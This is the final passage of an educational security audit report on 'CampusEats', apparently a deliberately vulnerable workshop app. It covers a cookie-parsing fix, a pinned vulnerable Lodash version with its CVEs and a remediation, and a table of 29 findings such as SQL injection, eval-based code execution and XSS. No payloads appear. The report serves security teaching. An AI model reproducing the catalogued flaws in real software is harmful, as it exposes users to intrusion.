  const parsed = JSON.parse(req.cookies.cart || '[]');
  cart = Array.isArray(parsed) ? parsed : [];
} catch (err) {
  cart = [];
}
res.locals.cartCount = cart.reduce((total, item) => total + (Number(item.qty) || 0), 0);
```

---

### 🟡 #29 — Known Vulnerable Dependency: Lodash 4.17.15

**File:** `package.json` — Line 21  
**Severity:** Medium | **CWE-1035** | **OWASP A06: Vulnerable & Outdated Components**

**Vulnerable Code:**
```json
// package.json  Line 21
"lodash": "4.17.15"
```

**Explanation:**  
Lodash 4.17.15 is pinned to an **exact vulnerable version** (no `^` range). This version is affected by:

| CVE | Issue | Severity |
|-----|-------|----------|
| **CVE-2021-23337** | `_.template` command injection — if user input is passed to `_.template`, arbitrary code runs | High |
| **CVE-2020-8203** | Prototype pollution via `_.merge`, `_.mergeWith`, `_.defaultsDeep` | High |
| **CVE-2019-10744** | Prototype pollution via `_.defaultsDeep` | Critical |

The app uses `_.sortBy` (server.js line 45), which is safe. However, the vulnerable functions exist in the
bundle and could be called accidentally or through future code additions. Using a known-vulnerable pinned
version is a maintenance and supply-chain risk.

**Correct Fix:**
```bash
# Upgrade to the latest patched version
npm install lodash@latest

# Or — since only _.sortBy is used, replace with native JS and drop lodash entirely:
```
```js
// server.js — replace:
//   const products = db.all('SELECT * FROM products');
//   res.render('home', { products: _.sortBy(products, 'name') });
// with:
const products = db.all('SELECT * FROM products ORDER BY name ASC');
res.render('home', { products });
// Then remove: const _ = require('lodash'); and lodash from package.json
```

---

## Complete Summary Table

| # | Vulnerability | Severity | CWE | OWASP 2021 |
|---|---------------|----------|-----|------------|
| 1 | SQL Injection — Login | 🔴 Critical | CWE-89 | A03: Injection |
| 2 | SQL Injection — Search | 🔴 Critical | CWE-89 | A03: Injection |
| 3 | RCE via `eval()` — Coupon | 🔴 Critical | CWE-95 | A03: Injection |
| 4 | OS Command Injection — Export | 🔴 Critical | CWE-78 | A03: Injection |
| 5 | Path Traversal — Receipt | 🔴 Critical | CWE-22 | A01: Broken Access Control |
| 6 | No Auth on Admin Panel | 🔴 Critical | CWE-862 | A01: Broken Access Control |
| 7 | Reflected XSS — Search | 🔴 Critical | CWE-79 | A03: Injection |
| 8 | Stored XSS — Reviews | 🟠 High | CWE-79 | A03: Injection |
| 9 | IDOR — Order Details | 🟠 High | CWE-639 | A01: Broken Access Control |
| 10 | Privilege Escalation via Role | 🟠 High | CWE-269 | A01: Broken Access Control |
| 11 | Weak Hashing — MD5 Unsalted | 🟠 High | CWE-916 | A02: Cryptographic Failures |
| 12 | Guessable Session ID | 🟠 High | CWE-330 | A07: Auth Failures |
| 13 | Open Redirect — `next` param | 🟠 High | CWE-601 | A01: Broken Access Control |
| 14 | Session Not Killed on Logout | 🟠 High | CWE-613 | A07: Auth Failures |
| 15 | Unsigned Cart Cookie | 🟠 High | CWE-345 | A04: Insecure Design |
| 16 | Client-Trusted Price at Checkout | 🟡 Medium | CWE-20 | A04: Insecure Design |
| 17 | Negative Quantity in Cart | 🟡 Medium | CWE-20 | A04: Insecure Design |
| 18 | Cookie Missing Security Flags | 🟡 Medium | CWE-614 | A02: Cryptographic Failures |
| 19 | No Brute-Force Protection | 🟡 Medium | CWE-307 | A07: Auth Failures |
| 20 | Missing Security Headers | 🟡 Medium | CWE-1021 | A05: Misconfiguration |
| 21 | Stack Trace / SQL in Error Page | 🟡 Medium | CWE-209 | A05: Misconfiguration |
| 22 | Hardcoded Plaintext Passwords | 🟡 Medium | CWE-798 | A02: Cryptographic Failures |
| 23 | API Key in Source Code | 🟡 Medium | CWE-312 | A02: Cryptographic Failures |
| 24 | Wildcard CORS | 🟡 Medium | CWE-942 | A05: Misconfiguration |
| 25 | No CSRF Protection | 🟡 Medium | CWE-352 | A01: Broken Access Control |
| 26 | `.env` Committed to Git | 🟡 Medium | CWE-312 | A02: Cryptographic Failures |
| 27 | Sessions Never Expire (Memory Leak) | 🟡 Medium | CWE-400 | A07: Auth Failures |
| 28 | Malformed Cart Cookie Crashes App | 🟡 Medium | CWE-755 | A05: Misconfiguration |
| 29 | Vulnerable Dependency — Lodash 4.17.15 | 🟡 Medium | CWE-1035 | A06: Outdated Components |

---

*Report generated for educational purposes — CampusEats Security Workshop.*
